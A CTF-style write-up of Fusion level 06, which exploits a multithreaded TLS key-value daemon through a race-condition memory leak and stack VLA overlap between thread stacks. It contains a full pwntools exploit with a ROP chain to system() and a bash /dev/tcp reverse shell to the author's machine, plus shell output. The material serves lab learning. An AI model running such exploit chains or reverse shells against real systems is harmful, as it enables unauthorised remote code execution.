@@ -1,0 +1,822 @@
+---
+title: Fusion level 06 - Multithreaded fun
+description: Multithreaded stack overrun, information leaks, and other lessons on why you should lock shared data
+image: rsc/imgs/redmap.png
+author: execius
+date: 2026-02-24
+tags: [binary exploitation]
+---
+
+- edit : after nearly two months of hiatus I'm back to this with  a new pair of eyes , I trust I will solve it this time , learn more about the inctricacies of multithreaded programs and move on to other challenges , so let's go!. 
+
+
+## source code 
+```C
+#define THREADED
+#include "../common/common.c"
+
+// Taken some code from gnu tls documentation, 
+// This example is a very simple echo server which supports X.509
+// authentication, using the RSA ciphersuites. 
+// This file has the leading comment of... /* This example code is
+// placed in the public domain. */
+// so there :>
+
+#include <gcrypt.h>
+#include <gnutls/gnutls.h>
+
+#include <libHX/init.h>
+#include <libHX/defs.h>
+#include <libHX/map.h>
+#include <libHX/string.h>
+
+#define KEYFILE "/opt/fusion/ssl/key.pem"
+#define CERTFILE "/opt/fusion/ssl/cert.pem"
+#define CAFILE "/opt/fusion/ssl/ca.pem"
+#define CRLFILE "/opt/fusion/ssl/crl.pem"
+
+gnutls_certificate_credentials_t x509_cred;
+gnutls_priority_t priority_cache;
+
+static gnutls_session_t
+initialize_tls_session (void)
+{
+  gnutls_session_t session;
+
+  gnutls_init (&session, GNUTLS_SERVER);
+
+  gnutls_priority_set (session, priority_cache);
+
+  gnutls_credentials_set (session, GNUTLS_CRD_CERTIFICATE, x509_cred);
+
+  /* 
+   *request client certificate if any.
+   */
+  gnutls_certificate_server_set_request (session, GNUTLS_CERT_REQUEST);
+
+  return session;
+}
+
+
+struct HXmap *dict;
+
+struct data {
+  void *data;
+  size_t length;
+};
+
+struct data *gather_data(gnutls_session_t session, char *key, size_t length)
+{
+  unsigned char buffer[length];
+  int offset, ret;
+  struct data *data;
+
+  for(offset = 0; offset < length; ) {
+    ret = gnutls_record_recv(session, buffer + offset, (length - 
+      offset) > 65535 ? 65535 : (length - offset));
+    if(ret <= 0) return NULL;
+    offset += ret;
+  }
+
+  data = malloc(sizeof(struct data));
+  if(! data) return NULL;
+  data->data = HX_memdup(buffer, length);
+  if(!data->data) {
+    free(data);
+    return NULL;
+  }
+  data->length = length;
+
+  //printf("gather data: returning %08x, data->length = %d\n", data, 
+  // data->length);
+  //fflush(stdout);
+
+  return data;
+}
+
+#define NOKEY "// No key was specified\n"
+#define NOTFOUND "// Key was not found\n"
+#define KEYFOUND "// Key exists\n"
+#define NOMEM "// Not enough memory to allocate\n"
+#define UPDATEOK "// Updated successfully\n"
+
+int update_data(gnutls_session_t session, char *key, size_t length)
+{
+  struct data *data;
+  size_t offset;
+  int ret;
+
+  data = HXmap_get(dict, key);
+  if(! data) {
+    gnutls_record_send(session, NOTFOUND, strlen(NOTFOUND));
+    return -1;
+  }
+
+  if(length > data->length) {
+    void *tmp;
+    tmp = realloc(data->data, length);
+    if(! tmp) {
+      gnutls_record_send(session, NOMEM, strlen(NOMEM));
+      return -1;
+    }
+    data->data = tmp;
+  }  
+
+  for(offset = 0; offset < length; ) {
+    ret = gnutls_record_recv(session, data->data + offset, 
+      (length - offset) > 65535 ? 65535 : (length - offset));
+    if(ret <= 0) return 0;
+    offset += ret;
+  }
+
+  gnutls_record_send(session, UPDATEOK, strlen(UPDATEOK));
+
+  data->length = length;
+  return 0;
+}
+
+int send_data(gnutls_session_t session, char *key, struct data *data)
+{
+  int offset, ret;
+  int to_send;
+
+  char *msg;
+
+  asprintf(&msg, "// Sending %d bytes\n", data->length);
+  gnutls_record_send(session, msg, strlen(msg));
+  free(msg);
+
+  for(offset = 0; offset < data->length; ) {
+    int tosend;
+    tosend = (data->length - offset) > 65535 ? 65535 : 
+      (data->length - offset);
+    ret = gnutls_record_send(session, data->data + offset,
+       tosend);
+    if(ret <= 0) return -1;
+    offset += ret;
+  }
+  return 0;
+}
+
+void *free_data(void *ptr)
+{
+  struct data *data;
+  data = (struct data *)(ptr);
+
+  //printf("in free data, got %08x\n", (unsigned int)data);
+  if(data) {
+    if(data->data) {
+      free(data->data);
+    }
+    free(data);
+  }
+}
+
+void new_dict()
+{
+  struct HXmap_ops mops;
+  if(dict) HXmap_free(dict);
+  
+  memset(&mops, 0, sizeof(mops));
+  mops.d_free = free_data;
+  
+  dict = HXmap_init5(HXMAPT_HASH, HXMAP_SKEY | HXMAP_CKEY, &mops, 
+    0, sizeof(struct data));
+}
+
+
+void *keyval_thread(void *arg)
+{
+  int fd = (int)arg;
+  int ret;
+  struct data *data;
+  int cont;
+
+  gnutls_session_t session;
+  session = initialize_tls_session ();
+
+  gnutls_transport_set_ptr (session, (gnutls_transport_ptr_t) fd);
+  ret = gnutls_handshake (session);
+
+  if (ret < 0) {
+    char *msg;
+
+    close (fd);
+    gnutls_deinit (session);
+  
+    msg = NULL;
+    asprintf(&msg, "*** Handshake has failed (%s)\n\n", 
+      gnutls_strerror(ret));
+    write(fd, msg, strlen(msg));
+    close(fd);
+    free(msg);
+        }
+
+#define BANNER "// Welcome to KeyValDaemon. Type 'h' for help information\n"
+  gnutls_record_send(session, BANNER, strlen(BANNER));
+
+  cont = 1;
+  while(cont) {
+    char cmdbuf[512], *p;
+    char *args[6], *msg;
+    int argcnt, i;
+
+    memset(cmdbuf, 0, sizeof(cmdbuf));
+    ret = gnutls_record_recv(session, cmdbuf, sizeof(cmdbuf));
+    if(ret <= 0) break;
+
+    p = strchr(cmdbuf, '\r');
+    if(p) *p = 0;
+    p = strchr(cmdbuf, '\n');
+    if(p) *p = 0;
+
+    memset(args, 0, sizeof(args));
+    argcnt = HX_split5(cmdbuf, " ", 6, args);
+
+#if 0
+    for(i = 0; i < argcnt; i++) {
+      asprintf(&msg, "args[%d] = \"%s\"\n", i, args[i]);
+      gnutls_record_send(session, msg, strlen(msg));
+      free(msg);
+    }
+#endif
+
+
+
+    switch(args[0][0]) {
+      case 'h': 
+#define HELP \
+"// f <key> - find entry and see if it exists\n" \
+"// s <key> <bytes> - store an entry with key and <bytes> lenght of data\n" \
+"// g <key> - read data from key\n" \
+"// d <key> - delete key/data\n" \
+"// X - delete all data and restart\n" 
+// XXX, loop over HXmap and display data? 
+  
+        gnutls_record_send(session, HELP, strlen(HELP));
+        break;
+      case 'd':
+        if(! args[1]) {
+          gnutls_record_send(session, NOKEY, strlen(NOKEY));
+        } else {
+          void *data;
+
+          data = HXmap_del(dict, args[1]);
+          if(data) {
+            gnutls_record_send(session, KEYFOUND, 
+              strlen(KEYFOUND));
+          } else {
+            gnutls_record_send(session, NOTFOUND,
+              strlen(NOTFOUND));
+          }
+        }
+        break;
+      case 's': // set
+        data = gather_data(session, args[1], atoi(args[2]));
+        if(data != NULL) {
+#define NEWKEY "// New key added!\n"
+          printf("args[1] = %08x/%s, data = %08x\n", 
+            args[1], args[1], data);
+          HXmap_add(dict, args[1], data);
+          gnutls_record_send(session, NEWKEY, 
+            strlen(NEWKEY));
+        } else {
+#define ADDERROR "// Unable to add new entry, problem getting data\n"
+          gnutls_record_send(session, ADDERROR, 
+            strlen(ADDERROR));
+        }
+        break;
+      case 'u': // update
+        update_data(session, args[1], atoi(args[2]));
+        break;
+      case 'f': // find
+        if(! args[1]) {
+          gnutls_record_send(session, NOKEY, 
+            strlen(NOKEY));
+        } else {
+          if(HXmap_find(dict, args[1]) == NULL) {
+            gnutls_record_send(session, 
+            NOTFOUND, strlen(NOTFOUND));
+          } else {
+            gnutls_record_send(session,
+            KEYFOUND, strlen(KEYFOUND));
+          }
+        }
+
+        break;
+
+      case 'g': // get
+        if(! args[1]) {
+          gnutls_record_send(session, NOKEY, 
+            strlen(NOKEY));
+        } else {
+          if((data = HXmap_get(dict, args[1])) 
+            == NULL) {
+            gnutls_record_send(session, NOTFOUND,
+            strlen(NOTFOUND));
+          } else {
+            send_data(session, args[1], data);
+          }
+        }
+        break;
+      case 'e':
+        cont = 0;
+        break;
+      case 'X':
+        new_dict();
+#define NEWDICT "// New dictionary installed\n"
+        gnutls_record_send(session, NEWDICT,
+        strlen(NEWDICT));
+        break;
+      default:
+#define UC "// Unknown Command, please see 'h' for help information\n"
+
+        gnutls_record_send(session, UC, strlen(UC));
+        break;
+    }
+  }
+
+
+#define GB "// Good bye!\n"
+  gnutls_record_send(session, GB, strlen(GB));
+  gnutls_bye(session, GNUTLS_SHUT_WR);
+
+  close(fd);
+  gnutls_deinit(session);
+
+  return NULL;
+}
+
+#define DH_BITS 512
+
+static gnutls_dh_params_t dh_params;
+
+static int generate_dh_params (void)
+{
+  /* 
+   * Generate Diffie-Hellman parameters - for use with DHE
+   * kx algorithms. When short bit length is used, it might
+   * be wise to regenerate parameters.
+   *
+   */
+  gnutls_dh_params_init (&dh_params);
+  gnutls_dh_params_generate2 (dh_params, DH_BITS);
+
+  return 0;
+}
+
+GCRY_THREAD_OPTION_PTHREAD_IMPL;
+
+int main(int argc, char **argv)
+{
+  int fd, i;
+
+  HX_init();
+
+  gcry_control(GCRYCTL_SET_THREAD_CBS, &gcry_threads_pthread);
+  gnutls_global_init();
+
+  gnutls_certificate_allocate_credentials (&x509_cred);
+  gnutls_certificate_set_x509_trust_file (x509_cred, CAFILE,
+            GNUTLS_X509_FMT_PEM);
+
+  gnutls_certificate_set_x509_crl_file (x509_cred, CRLFILE,
+            GNUTLS_X509_FMT_PEM);
+
+  gnutls_certificate_set_x509_key_file (x509_cred, CERTFILE, KEYFILE,
+          GNUTLS_X509_FMT_PEM);
+
+  generate_dh_params ();
+
+  gnutls_priority_init (&priority_cache, "NORMAL", NULL);
+  gnutls_certificate_set_dh_params (x509_cred, dh_params);
+
+  new_dict();
+
+  signal(SIGPIPE, SIG_IGN);
+
+  background_process(NAME, UID, GID);  
+  serve_forever_threaded(PORT, keyval_thread);
+}
+```
+## static analysis 
+- i will put a lot of detail of time in this , as they say , time spent on recon is rarely wasted , and I have learned this truth the hard way on my previous attempt with this challenge .
+- my usual strategy , start in main and follow the execution chain .
+- before that we note that the dictionary declared in the line
+```c 
+struct HXmap dict;
+```
+is the only global variable in the code , that mean that probably any data corruption done with a multithreded approach is bound to happen though that dictionary.
+- we also note a possibility of corrupting the length of a data in the `data` struct declared in the code :
+```c
+struct data {
+  void *data;
+  size_t length;
+};
+```
+since the data is contiguous , and leaking the length will allow a leak if some data printing function exists and depends on the length field , we'll leave this possibility in here.
+- the first function from our code is `new_dict` which seems too free the global dictionary if one is allocated , zero its memory and set its freeing function to `free_data` allocate a new one .
+- analysing `free_data` , it seems simple , it takes a pointer to a data structure , frees its `data` field if it isn't null , and free the data struct pointer itself, it will free the struct anyway , we could have a UAF here.
+- returning to main we know tha the program will ignore `SIGPIPE` , then we can jump to the line that starts a `keyval_thread` thread for each instance , here is where it gets meaty.
+- now for the analysis of `keyval_thread` , the function and by extension the thread gets a file descriptor as argument and starts by doing a `gnutls` handshake , if it fails the program closes the `fd` and then tries to write an error to it ??? suspicious .
+- anyway , after that we have an infinite loop , the notable things are that it allocates a buffer `buf` in the stack that we give input into ,it splits it to six arguments , the first (accurately , the first character of the first) is put into a switch statement and it decides the operation that will be done , we got this little menu of what we can do :
+```c
+#define HELP \
+"// f <key> - find entry and see if it exists\n" \
+"// s <key> <bytes> - store an entry with key and <bytes> lenght of data\n" \
+"// g <key> - read data from key\n" \
+"// d <key> - delete key/data\n" \
+"// X - delete all data and restart\n" 
+```
+- we have a function that displays data , one that sets it and one that deletes it , another to reset the entire shared dict , this is good stuff , since as far as I can see no locks are there to prevent simultaneous operations by threads (on the same dictionary !!!).
+- now let's go for each operation's switch case's code :
+	- d : checks if argument with index 1 exists , if not exit  , if yes pass it to a delete function in the HX library , although not much checking is done on the data , i don't suspect anything could be done here specifically  .
+	- s : as the menu says this sets an entry with a key and length ,and jackpot ! , then length is not sanity checked ! , moreover the function collects data of the said length using the `gather_data` function , so let's check that .
+		- the function `gather_data` allocates a buffer in the stack with whatever length we give it , variable length array , honestly i already found this on my first try , in short , we can allocate chunks so big and make the stack (and by extension our writing point) go so low that we write directly (and without overwrite ) in the stack of other threads , potentially hijacking they execution flow (plot twists : I already did it , it's possible , but that's only the first part of the problem)
+		- moreover , we have an opportunity for head spraying here , as the function allocates a data struct gives a copy of the data to it by duplicating it with function `HX_memdup`  , which without doubt uses the head like the classic `memdup`.
+		- the rest of the function along with the code block for the s option have nothing suspicious it seems , what we have is good already !
+	- u : same unchecked length issue in the s option , the `update_data` function is similar to the `gather_data`  , same data reading mechanism , but here if the length provided is larger than the one in the data struct being modifies ,a realloc is performed , the weird thing is that the length in the structure isn't modified until the end of the function ? , more notably , the actual modification of the data happens before that , could we have a chance of inducing mismatched data/length here ? interesting . 
+	- f : seems simple , checks if a key exists , nothing suspicious.
+	- g : if a key is found this calls the `send_data` function , which has a sending style similar to the way `gather_data` and `update_data` receive data , I guess the `gnutls` functions used i transmission and reception here have a hard limit of 65535 , thus the funny code .
+```c
+for(offset = 0; offset < length; ) {
+    ret = gnutls_record_recv(session, buffer + offset, (length - 
+      offset) > 65535 ? 65535 : (length - offset));
+    if(ret <= 0) return NULL;
+    offset += ret;
+  }
+```
+- e : exit , obvio
+- x : deletes dict and makes a new one , might be interesting in race conditions.
+## Dynamic analysis and funny things at runtime 
+- let's boot up the VM and examine this for ourselves !
+- connecting to the VM on the challenge port using a `gnutls` hack, and trying the different features of the `keyval_thread` function , everything works just fine :
+```
+// Welcome to KeyValDaemon. Type 'h' for help information
+$ s t 4
+$ dddd
+// New key added!
+// Unknown Command, please see 'h' for help information
+$ g t
+// Sending 4 bytes
+dddd$ u t 4
+$ gggg
+// Updated successfully
+// Unknown Command, please see 'h' for help information
+$ g t
+// Sending 4 bytes
+gggg$ f t
+// Key exists
+$ X
+// New dictionary installed
+$ f t
+// Key was not found
+$ g t
+// Key was not found
+$ s t 4
+$ dddd
+// New key added!
+// Unknown Command, please see 'h' for help information
+$ d t
+// Key exists
+$ f t
+// Key was not found
+$ e
+// Good bye!
+```
+- before attacking the UAL stack overflow(overrun?) , it might be interesting to see what we can do with the total lack of data locking/simultaneous operations between threads , I hope to get some kind of leak  , 
+- we can stop the program  in two places , those are where it waits for data , the point is while the program is waiting for input it assumes data integrity , let's see if we can violate that assumption and turn in to our advantage. before that however , for facility I will make some helper functions so I can set/update/delete... with function calls in my script .
+- after havig done that , i realized that the `gather_data` function stores the user input in a buffer and only puts it into data structure along with the length at the end , so I guess we're left with `update_data` as the target , which modifies `data->data` directly in the line :
+```c
+ret = gnutls_record_send(session, data->data + offset,
+       tosend);
+```
+## THE LEAK
+- the goal here is to have a `data` structure to have mismatched fields , so that the `data->length` field is actually larger than the size of data in `data->data` , that so we can do a `get` operation and  **read uninitialized data**.
+- to get a leak , we will exploit the fact the `update_data` function doesn't modify the length field of the data struct until the end of the function , the idea is to set up a key/data pair with a small length using `s` functionality  let's say key `A` with length `1`.
+- data is now : 
+- then we update it with the `u` one to a greater size lets say 1500 ,so we trigger `realloc` and get a new `data` buffer ,but we only send a part of the update input , let's say 1400 bytes , and let the function waiting for the rest of the data , hanging there while we do other stuff , at this stage , the actual `data` field is our newly send one , but he length  won't be set to the new one we specified until we send the remaining data , so we still have a length of 1 .
+- data is now :
+- now  while the second thread is waiting for data completion ,from another third thread we do the same thing we did with the second thread , but we keep the length less than the one we specified with the second thread , and this time we send the whole data and complete the update , all the while the second thread is still waiting for its remaining 50 bytes . 
+- data is now :
+- and finally we send the 50 bytes in the second thread , that will set the length field to 1400 , but the `data->data` pointer in the data structure actually points to the buffer set up by the third thread's update , and bingoo , we have a mismatch , a `data->data` of 1400 bytes of actual input , and a `data->length` that is 1500! 
+- now a  `g A` operation yields :
+  ```
+	b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd9\x02\x00\x00@\x96v\xb7@\x96v\xb7\xf0\xa2\x04\xb9\xf0\xa2\x04\xb9aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
+  ```
+- it just so happens that that random data between the a's is an address in libc , and further more it sits at  a fixed position from the program's .text section and **THE STACKS OF THE THREADS** , while the actual program stack has its own randomized stack , the stacks of threads are in the same space as shared libraries and thus sit at a fixed offset from the shared libraries , whose addresses we just leaked .
+- now we have the base address of all libraries, most importantly `libc` so we can call any libc function  . plus a way to write to the stacks of a thread **AND** know the exact address of what we have written , so we can later put commands and pass their addresses as arguments to `system`.
+# the stack VLA 
+## pthread multithreaded memory layout 
+- to be concise , the stacks of threads are allocated contiguously and are separated by what's known as `guard pages` , which are - 0x1000 (4096) bytes memory buffers that are now readable/writeable or executable , and any attempt to do so will end with a segfault 
+- `guard page` would have been a problem if this was some kind of gigantic overflow , but what we will do will allow us  precise write access without overwriting the memory leading to where we wanna write , unlike classic overflows .
+- this is how the memory of a multithreaded program that uses pthreads looks :
+```
+	MULTITHREADED MEMORY LAYOUT
+===========================
+HIGH: 0xffffffff
+┌────────────────────────┐
+│       KERNEL           │
+├────────────────────────┤
+│   MAIN THREAD STACK    │
+├────────────────────────┤
+│                        │
+│    THREAD STACKS       │
+│                        │
+│ 0xb7585000 ┌─────────┐ │
+│            │THREAD 2 │ │
+│ 0xb6d85000 ├─────────┤ │  
+│            │▒▒GUARD▒▒│ │
+│ 0xb6d84000 ├─────────┤ │
+│            │THREAD 1 │ │
+│ 0xb6584000 ├─────────┤ │
+│            │▒▒GUARD▒▒│ │
+│ 0xb6583000 ├─────────┤ │
+│            │THREAD 0 │ │
+│ 0xb5d83000 └─────────┘ │
+│   ▒ = 4KB Guard Page   │
+├────────────────────────┤
+│         HEAP           │
+├────────────────────────┤
+│      LIBRARIES         │
+├────────────────────────┤
+│       BINARY           │
+└────────────────────────┘
+LOW: 0x00000000
+
+STACK GROWTH:
+Thread 2: 0xb7585000↓0xb6d85000
+Thread 1: 0xb6d84000↓0xb6584000  
+Thread 0: 0xb6583000↓0xb5d83000
+```
+- now because for example I control the buffer size in thread 2 , I can make so big (more than 8mb ) and the bottom of the buffer (where I can write upwards) will be located in the stack of the thread 1 , so if my buffer size is so big , I can write anywhere in any memory lower than thread 2 without touching  guard pages ! , an by manipulating the size allocated , I can choose precisely where I write , there a small catch which is that the size will be padded to be 16 byte aligned , so you can only $begin$ writing in an address that's 16 bytes aligned.
+- an issue here is that when we allocate the gigantic array , the stack frames of the functions called by `gather_data` of the attacker thread need to be $below$ that array , and if we don't make space for them they corrupt the stack frames of the victim threads's functions , essantially an issue of two threads using the same memory region as their stack
+- found the key insight to bypass the issue  : so you can modify the stack of a thread from another using the top one , without the stack frame of the latter fucking up everything , create space with the `gather data` VLA trick in the victim thread itself and let the stacks of the modifier be there while modifying `gathe_data` frame and not affecting what's down the stack; never mind what you've just read I was sleepy and motivated .
+- we need roughly 600 bytes to contain the stack frames of the attacker thread, calculated it by substracting the last frame's esp from `gather_data`'s in the said thread in gdb.
+- now the idea is to create space for the stack frames of the attacker thread's functions in the victim thread's stack using the VLA trick , we now have a complete execution redirection primitive , but we do need a leak for that to be useful.(which we have)
+## The Exploit 
+- as I said , i have made some function to facilitate making a gnutls connection to the target and perform key operations like set and update programatically  here they are , DISCLAIMER : BAD CODE AHEAD :
+```python
+#!/usr/bin/python3
+from pwn import *
+context.log_level='critical'
+
+serverip = 'redacted'
+my_local_ip = 'redacted'
+port = 20006
+VLA_offset = 8390000 + 3204 - 560
+libcelf = ELF('./libc.so.6')
+
+def new_instance(serverip,port):
+    try : 
+        p = process(['gnutls-cli','-p', str(port) , serverip,'--insecure'])
+        p.recvuntil(b"// Welcome to KeyValDaemon. Type 'h' for help information")
+        return p
+    except Exception as e :
+        print("couldn't connect , a crash ?\n\n here is the error :\n")
+        print(e)
+        exit()
+        pass
+
+def set_key(p,key,lenght,strtosend):
+    p.send(b's '+key.encode()+b' '+str(lenght).encode()+b'\n')
+    p.send(strtosend)
+
+def update_key(p,key,lenght,strtosend):
+    p.send(b'u '+key.encode()+b' '+str(lenght).encode()+b'\n')
+    sleep(1)
+    p.send(strtosend.encode()+b'\n')
+    p.recvuntil(b'successfully')
+    print('updated variable successfully\n')
+
+
+```
+
+- you can also see in the code above that i have set the elfs of libc (downloaded from the vm) for facility calculating offsets , and the VLA offset I calculated by examining memory in `gdb`. 
+- now  we are going to leak leak the address of libc using the leak primitive we got earlier :
+```python
+# leaking libc
+p = new_instance(serverip,port)
+k = new_instance(serverip,port)
+
+set_key(p,'A',1,b'a')
+p.send(b'u A 1500\n')
+p.send(1450*b'a')
+sleep(3)
+k.send(b'u A 1400\n')
+sleep(3)
+p.send(49*b'a'+b'\n')
+p.recvuntil(b'added!')
+p.send(b'g A\n')
+p.recvuntil(b'// Sending 1500 bytes\n')
+libcleak =  p.recvuntil(b'\n')
+libcleak = u32(libcleak[1412:1416])
+libc_addr = libcleak  - 1545776
+libc_addr = libc_addr & 0xfffff000
+p.close()
+k.close()
+```
+- this code does the exact same operation we talked about in the leak section 
+- after that , we set the base address for the `libc` elf variable and use it to calculate other addresses , thanks to `pwntools` :
+```python
+#setting up addresses
+libcelf.address = libc_addr
+system_libc_addr = libcelf.symbols['system']
+exit_libc_addr = libcelf.symbols['exit']
+twopopret_gad = libc_addr + 0x000a7a5a
+print(f'\n[LEAKED LIBC ADDR : {hex(libc_addr)}]\n')
+```
+#### injecting a reverse shell command 
+-  even though we have an execution primitive now and a leak ,to get our shell we can't just do `system("/bin/sh")` , bcs there's a tls connection between us and the server , my solution was to put a reverse shell command string in the stack of a thread by setting a key and passing the reverse shell command to it as data for the key , if you remember dear reader , `gather_data` function that is used in the set key functionality allocates a buffer and puts the data in it before copying to a `data->data` field in a  `data` data structure, that's how our input reaches the stack .
+- you may also ask how do I know the address in the stack of the input I'm going to send  , i can do that thanks to the fact that the stack of a thread , unlike the main stack of the process , is at a fixed position from `libc` and other shared libraries , thanks to the fact that the stacks of the threads are `mmap`ed just like shared libraries , and while the base of `mmap` is randomized with `ASLR` , if we leak just one address of a `mmaped` memory location , we can know the addresses of every other memory gotten with `mmap` , for further details see [[ASLR]] , the main point here is that i could determine the address of our command in the stack just by calculating its offset from `libc` in gdb and adding that offset to the `libc` address we leak. 
+- then we pass the address of the command to system , the command is this :
+```bash
+bash -i >& /dev/tcp/'+my_local_ip.encode()+b'/1666'+b' <&1
+```
+- and it tells the vm to execute a shell , connect to my machine at port 1666 and forward the input and output file descriptors of the shell to the connection.
+#### control flow redirection 
+- what remains now is the actual control flow redirection which I'll do with a `ROP` chain thanks to the addresses i got from the `libc` leak , in the following code , after placing my command in the stack of thread `l` and making the `ROP` chain , I have opened two threads `k` and `p` , while `k` is waiting for an update operation to be completed , we use the stack overrun vulnerability to write our `ROP` chain to `k`'s stack , and then sent to `k` the data it is waiting for and make it return to our `ROP` chain , which gives us a sweet shell on port 1666.
+```python
+p = new_instance(serverip,port)
+k = new_instance(serverip,port)
+l = new_instance(serverip,port)
+
+
+#starting a process that listen on port 1666 for the shell
+print('\n[LISTENING FOR SHELL]\n')
+processarr = ['nc','-v',"-lp" ,'1666']
+shell = process(processarr)
+
+#putting the reverse shell command in a thread's stack
+reverse_shell = b'bash -i >& /dev/tcp/'+my_local_ip.encode()+b'/1666'+b' <&1\n'
+set_key(l,'revshell',85535,reverse_shell+p8(0)+65535*b'a')
+sleep(3)
+#calculated at runtime with gdb , constant across runs
+reverse_shell_libc_offset = 34413856
+reverse_shell_str_addr = libc_addr - reverse_shell_libc_offset
+
+#spawning a shell with ROP
+rop_chain_shell = p32(system_libc_addr)+p32(exit_libc_addr)+p32(reverse_shell_str_addr)
+k.send(b's g 2000')
+set_key(p,'t',VLA_offset,12*p8(0x0)+rop_chain_shell)
+p.close()
+k.send(2000*b'a'+b'\n')
+sleep(10)
+testshell(shell)
+#fallback
+shell.interactive()
+exit()
+
+```
+#### the complete exploit 
+```python
+#!/usr/bin/python3
+from pwn import *
+context.log_level='critical'
+
+serverip = 'redacted'
+my_local_ip = 'redacted'
+port = 20006
+VLA_offset = 8390000 + 3204 - 560
+libcelf = ELF('./libc.so.6')
+
+def testshell(p):
+    #flush
+    p.recv(timeout=3)
+    p.sendline(b'echo congratz?\n')
+    sleep(2)
+    resp = p.recv(timeout=3)
+    if  b'congratz?' in resp:
+        print("\ncongratz!\n")
+        p.interactive()
+    p.close()
+    return False
+
+def new_instance(serverip,port):
+    try : 
+        p = process(['gnutls-cli','-p', str(port) , serverip,'--insecure'])
+        p.recvuntil(b"// Welcome to KeyValDaemon. Type 'h' for help information")
+        return p
+    except Exception as e :
+        print("couldn't connect , a crash ?\n\n here is the error :\n")
+        print(e)
+        exit()
+        pass
+
+def set_key(p,key,lenght,strtosend):
+    p.send(b's '+key.encode()+b' '+str(lenght).encode()+b'\n')
+    p.send(strtosend)
+
+def update_key(p,key,lenght,strtosend):
+    p.send(b'u '+key.encode()+b' '+str(lenght).encode()+b'\n')
+    sleep(1)
+    p.send(strtosend.encode()+b'\n')
+    p.recvuntil(b'successfully')
+    print('updated variable successfully\n')
+
+
+# leaking libc
+p = new_instance(serverip,port)
+k = new_instance(serverip,port)
+
+set_key(p,'A',1,b'a')
+p.send(b'u A 1500\n')
+p.send(1450*b'a')
+sleep(3)
+k.send(b'u A 1400\n')
+sleep(3)
+p.send(49*b'a'+b'\n')
+p.recvuntil(b'added!')
+p.send(b'g A\n')
+p.recvuntil(b'// Sending 1500 bytes\n')
+libcleak =  p.recvuntil(b'\n')
+libcleak = u32(libcleak[1412:1416])
+libc_addr = libcleak  - 1545776
+libc_addr = libc_addr & 0xfffff000
+p.close()
+k.close()
+
+#setting up addresses
+libcelf.address = libc_addr
+system_libc_addr = libcelf.symbols['system']
+exit_libc_addr = libcelf.symbols['exit']
+twopopret_gad = libc_addr + 0x000a7a5a
+print(f'\n[LEAKED LIBC ADDR : {hex(libc_addr)}]\n')
+
+
+p = new_instance(serverip,port)
+k = new_instance(serverip,port)
+l = new_instance(serverip,port)
+
+
+#starting a process that listen on port 1666 for the shell
+print('\n[LISTENING FOR SHELL]\n')
+processarr = ['nc','-v',"-lp" ,'1666']
+shell = process(processarr)
+
+#putting the reverse shell command in a thread's stack
+reverse_shell = b'bash -i >& /dev/tcp/'+my_local_ip.encode()+b'/1666'+b' <&1\n'
+set_key(l,'revshell',85535,reverse_shell+p8(0)+65535*b'a')
+sleep(3)
+#calculated at runtime with gdb , constant across runs
+reverse_shell_libc_offset = 34413856
+reverse_shell_str_addr = libc_addr - reverse_shell_libc_offset
+
+#spawning a shell with ROP
+rop_chain_shell = p32(system_libc_addr)+p32(exit_libc_addr)+p32(reverse_shell_str_addr)
+k.send(b's g 2000')
+set_key(p,'t',VLA_offset,12*p8(0x0)+rop_chain_shell)
+p.close()
+k.send(2000*b'a'+b'\n')
+sleep(10)
+testshell(shell)
+#fallback
+shell.interactive()
+exit()
+```
+- executing this in our host gives us :
+```bash 
+./level06_exploit.py
+
+[LEAKED LIBC ADDR : 0xb763b000]
+
+
+[LISTENING FOR SHELL]
+
+
+congratz!
+
+$ whoami
+whoami
+whoami: cannot find name for user ID 20006
+I have no name!@fusion:/$ $ ls
+ls
